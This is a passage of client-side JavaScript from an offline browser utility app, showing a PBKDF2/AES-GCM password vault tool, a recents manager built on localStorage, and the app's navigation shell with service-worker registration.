    const $=s=>root.querySelector(s), pw=$('#pw'), i=$('#i'), o=$('#o');
    bindRecent(root,'vault',[{el:i,key:'i'}]);
    async function deriveKey(password, salt){
      const base=await crypto.subtle.importKey('raw',enc(password),'PBKDF2',false,['deriveKey']);
      return crypto.subtle.deriveKey(
        {name:'PBKDF2',salt,iterations:600000,hash:'SHA-256'},
        base, {name:'AES-GCM',length:256}, false, ['encrypt','decrypt']);
    }
    $('#enc').onclick=async()=>{
      try{
        const salt=crypto.getRandomValues(new Uint8Array(16));
        const iv=crypto.getRandomValues(new Uint8Array(12));
        const key=await deriveKey(pw.value, salt);
        const ct=await crypto.subtle.encrypt({name:'AES-GCM',iv}, key, enc(i.value));
        const blob={v:1, salt:b64ubuf(salt), iv:b64ubuf(iv), ct:b64ubuf(ct)};
        o.textContent=JSON.stringify(blob);
      }catch(e){ o.textContent='error: '+e.message; }
    };
    $('#dec').onclick=async()=>{
      try{
        const blob=JSON.parse(i.value);
        if(blob.v!==1) throw new Error('unknown vault version');
        const salt=new Uint8Array([...atob(blob.salt.replace(/-/g,'+').replace(/_/g,'/'))].map(c=>c.charCodeAt(0)));
        const iv=new Uint8Array([...atob(blob.iv.replace(/-/g,'+').replace(/_/g,'/'))].map(c=>c.charCodeAt(0)));
        const ct=new Uint8Array([...atob(blob.ct.replace(/-/g,'+').replace(/_/g,'/'))].map(c=>c.charCodeAt(0)));
        const key=await deriveKey(pw.value, salt);
        const pt=await crypto.subtle.decrypt({name:'AES-GCM',iv}, key, ct);
        o.textContent=dec(pt);
      }catch(e){ o.textContent='error: '+e.message; }
    };
    $('#cp').onclick=()=>navigator.clipboard?.writeText(o.textContent);
  }
});

// =========================================================
// 17. Palette / recents / save-as-file
// =========================================================
tool({
  id:'about', name:'About / Recents', tags:['about','recents','settings'],
  render(root){
    root.innerHTML = `
      <h2>About / Recents</h2>
      <p class="note">D@%@$oul Studio v4 · ${TOOLS.length} tools · offline, no network calls, no analytics.</p>
      <div class="row">
        <button id="clr" class="red">clear all recents</button>
        <button id="exp" class="green">export all recents (json)</button>
      </div>
      <pre id="o" class="out"></pre>`;
    const $=s=>root.querySelector(s);
    $('#clr').onclick=()=>{
      Object.keys(localStorage).filter(k=>k.startsWith('ds_recent_')).forEach(k=>localStorage.removeItem(k));
      $('#o').textContent='cleared';
    };
    $('#exp').onclick=()=>{
      const dump={};
      Object.keys(localStorage).filter(k=>k.startsWith('ds_recent_')).forEach(k=>{ try{ dump[k]=JSON.parse(localStorage.getItem(k)); }catch(e){ dump[k]=localStorage.getItem(k); } });
      $('#o').textContent=JSON.stringify(dump,null,2);
    };
  }
});

// ---------- shell ----------
document.addEventListener('DOMContentLoaded', () => {
  const nav=document.getElementById('tools');
  const pane=document.getElementById('pane');
  const q=document.getElementById('q');
  function show(t){ pane.innerHTML=''; t.render(pane); localStorage.setItem('ds_last',t.id); }
  function buildNav(filter=''){
    nav.innerHTML='';
    const f=filter.toLowerCase();
    TOOLS.filter(t=>(t.name+' '+t.tags.join(' ')).toLowerCase().includes(f))
      .forEach(t=>{
        const b=document.createElement('button');
        b.textContent=t.name;
        b.onclick=()=>show(t);
        nav.appendChild(b);
      });
  }
  q.oninput=()=>buildNav(q.value);
  document.addEventListener('keydown', e=>{
    if((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==='k'){ e.preventDefault(); q.focus(); q.select(); }
  });
  buildNav();
  const last=localStorage.getItem('ds_last');
  show(TOOLS.find(t=>t.id===last)||TOOLS[0]);

  // PWA
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('./sw.js').catch(()=>{});
  }
});
})();
